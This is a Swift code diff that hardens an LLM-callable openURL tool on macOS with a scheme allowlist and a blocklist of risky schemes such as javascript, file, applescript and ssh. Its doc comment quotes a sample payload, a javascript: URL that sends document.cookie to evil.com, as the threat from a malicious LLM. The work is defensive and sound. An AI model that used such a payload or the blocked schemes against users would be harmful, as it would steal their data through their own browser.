@@ -53,19 +53,102 @@ actor ShortcutsController {
         )
     }
 
-    /// Open a url-scheme (`x-apple.systempreferences://…`, `shortcuts://`,
-    /// `mailto:`, `obsidian://`, app-specific schemes, …). Equivalent of
-    /// `open "url"` but with a structured ok/error envelope.
-    func openURL(_ url: String) -> RunResult {
-        guard URL(string: url) != nil else {
-            return RunResult(ok: false, name: url, stdout: nil,
-                             stderr: "invalid URL")
+    /// Schemes we explicitly BLOCK even if they're in the allowlist by
+    /// accident. These can exfiltrate data or execute arbitrary code through
+    /// the handling app:
+    ///   `javascript:` → runs arbitrary JS in the default browser tab
+    ///   `file:`       → opens arbitrary local files (incl. TCC-protected)
+    ///   `applescript:`→ runs AppleScript without further confirmation
+    ///   `vnc:/ssh:/smb:/afp:/ftp:` → remote connection attempts
+    ///   `tel:/facetime:/sms:` → initiates outbound calls/messages
+    private static let blockedSchemes: Set<String> = [
+        "javascript", "vbscript", "data",
+        "file",
+        "applescript",
+        "vnc", "ssh", "smb", "afp", "ftp", "sftp",
+        "tel", "facetime", "facetime-audio", "sms", "imessage",
+        "daap", "x-radio"
+    ]
+
+    /// Schemes explicitly permitted. Anything not on this list is rejected
+    /// with a structured reason so the LLM can see WHY and either switch
+    /// scheme or ask the user to add it.
+    private static let allowedSchemes: Set<String> = [
+        "http", "https",
+        "mailto",
+        "shortcuts",
+        "x-apple.systempreferences",
+        "obsidian",
+        "raycast",
+        "notion",
+        "linear",
+        "slack",
+        "zoommtg", "zoomus",
+        "vscode", "cursor",
+        "github-mac", "x-github-client",
+        "spotify",
+        "things", "omnifocus",
+        "music", "podcasts"
+    ]
+
+    public struct OpenURLResult: Codable, Sendable {
+        public let ok: Bool
+        public let url: String
+        public let scheme: String
+        public let stdout: String?
+        public let stderr: String?
+        public let blocked: Bool
+        public let blockReason: String?
+    }
+
+    /// Open a url-scheme. Codex v0.5.0 hardening (P0 #3): the previous
+    /// version passed ANY URL to `/usr/bin/open`, which is a capability
+    /// leak — a malicious LLM could craft `javascript:fetch('evil.com/'+
+    /// document.cookie)` and exfiltrate data through the user's default
+    /// browser. We now enforce:
+    ///
+    ///   1. Must parse as a URL with a scheme
+    ///   2. Scheme must be lowercase-matched against `allowedSchemes`
+    ///   3. Scheme must NOT be in `blockedSchemes` (defence-in-depth)
+    ///
+    /// Callers get a structured envelope with `blocked=true` and a human-
+    /// readable reason when the scheme is rejected.
+    func openURL(_ url: String) -> OpenURLResult {
+        guard let parsed = URL(string: url), let rawScheme = parsed.scheme else {
+            return OpenURLResult(
+                ok: false, url: url, scheme: "",
+                stdout: nil, stderr: "invalid URL — no scheme",
+                blocked: true, blockReason: "no_scheme"
+            )
         }
+        let scheme = rawScheme.lowercased()
+
+        if Self.blockedSchemes.contains(scheme) {
+            return OpenURLResult(
+                ok: false, url: url, scheme: scheme,
+                stdout: nil, stderr: nil,
+                blocked: true,
+                blockReason: "scheme '\(scheme)' is on the explicit blocklist (exfiltration / arbitrary-code risk)"
+            )
+        }
+        guard Self.allowedSchemes.contains(scheme) else {
+            return OpenURLResult(
+                ok: false, url: url, scheme: scheme,
+                stdout: nil, stderr: nil,
+                blocked: true,
+                blockReason: "scheme '\(scheme)' is not on the allowlist. Allowed: \(Self.allowedSchemes.sorted().joined(separator: ", "))"
+            )
+        }
+
         let r = ProcessRunner.run("/usr/bin/open", [url], timeout: 5)
-        return RunResult(
-            ok: r.ok, name: url,
+        return OpenURLResult(
+            ok: r.ok,
+            url: url,
+            scheme: scheme,
             stdout: r.stdout.isEmpty ? nil : r.stdout,
-            stderr: r.stderr.isEmpty ? nil : r.stderr
+            stderr: r.stderr.isEmpty ? nil : r.stderr,
+            blocked: false,
+            blockReason: nil
         )
     }
 }
